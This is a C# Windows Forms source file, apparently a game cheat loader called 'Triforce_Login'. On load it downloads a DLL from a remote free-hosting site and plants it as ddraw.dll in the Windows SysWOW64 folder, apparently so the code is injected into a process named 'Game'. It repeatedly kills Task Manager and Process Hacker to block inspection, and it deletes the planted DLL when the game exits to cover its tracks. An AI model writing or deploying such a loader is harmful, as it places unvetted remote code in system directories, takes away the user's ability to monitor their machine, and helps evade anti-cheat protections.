using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Triforce_Login
{
    public partial class inwf : Form
    {
        public inwf()
        {
            InitializeComponent();
        }

        private void inwf_Load(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://atomoproject.000webhostapp.com/Triforce/Dlls/wf.dll", @"C:\Windows\SysWOW64\ddraw.dll");
            Thread.Sleep(25000);
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string DLL = @"C:\Windows\SysWOW64\ddraw.dll";

            string Processo = "Game";
            string Processo1 = "Taskmgr";
            string Processo2 = "ProcessHacker";

            progressBar1.Maximum = 1;
            progressBar1.PerformStep();
            if (progressBar1.Maximum == 1)
            {
                if (Process.GetProcessesByName(Processo2).Length > 0)
                {
                    Process[] processes = Process.GetProcessesByName("ProcessHacker");

                    foreach (Process process in processes)
                    {
                        process.Kill();
                    }
                }
                else
                {
                    timer1.Stop();
                    timer2.Start();
                }

                if (Process.GetProcessesByName(Processo1).Length > 0)
                {
                    Process[] processes = Process.GetProcessesByName("Taskmgr");

                    foreach (Process process in processes)
                    {
                        process.Kill();
                    }
                }
                else
                {
                    timer1.Stop();
                    timer2.Start();
                }

                if (Process.GetProcessesByName(Processo).Length > 0)
                {

                    Process[] processes = Process.GetProcessesByName("Game");

                    foreach (Process process in processes)
                    {

                        timer1.Stop();
                        label1.Text = "$#8h31u20569ikjy2jHFus";
                        timer2.Start();
                    }
                }
                else
                {
                    try
                    {
                        if (File.Exists(DLL))
                        {
                            File.Delete(DLL);
                        }
                        else
                        {
                            // DLL não existe
                        }
                        timer1.Stop();
                        timer2.Stop();
                        Application.Exit();
                    }
                    catch
                    {
                        MessageBox.Show("Error 342");
                        Application.Exit();
                    }
                }
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {

            string DLL = @"C:\Windows\SysWOW64\ddraw.dll";

            string Processo = "Game";
            string Processo1 = "Taskmgr";
            string Processo2 = "ProcessHacker";

            progressBar2.Maximum = 1;
            progressBar2.PerformStep();
            if (progressBar2.Maximum == 1)
            {

                if (Process.GetProcessesByName(Processo2).Length > 0)
                {
                    Process[] processes = Process.GetProcessesByName("ProcessHacker");

                    foreach (Process process in processes)
                    {
                        process.Kill();
                    }
                }
                else
                {
                    timer2.Stop();
                    timer1.Start();
                }

                if (Process.GetProcessesByName(Processo1).Length > 0)
                {
                    Process[] processes = Process.GetProcessesByName("Taskmgr");

                    foreach (Process process in processes)
                    {
                        process.Kill();
                    }
                }
                else
                {
                    timer2.Stop();
                    timer1.Start();
                }

                if (Process.GetProcessesByName(Processo).Length > 0)
                {

                    Process[] processes = Process.GetProcessesByName("Game");

                    foreach (Process process in processes)
                    {
                        timer2.Stop();
                        label1.Text = "B47f(9f3482&*$#@840274";
                        timer1.Start();
                    }
                }
                else
                {
                    try
                    {
                        if (File.Exists(DLL))
                        {
                            File.Delete(DLL);
                        }
                        else
                        {
                            // DLL não existe
                        }
                        timer1.Stop();
                        timer2.Stop();
                        Application.Exit();
                    }
                    catch
                    {
                        MessageBox.Show("Error 342");
                        Application.Exit();
                    }
                }
            }
        }
    }
}
    
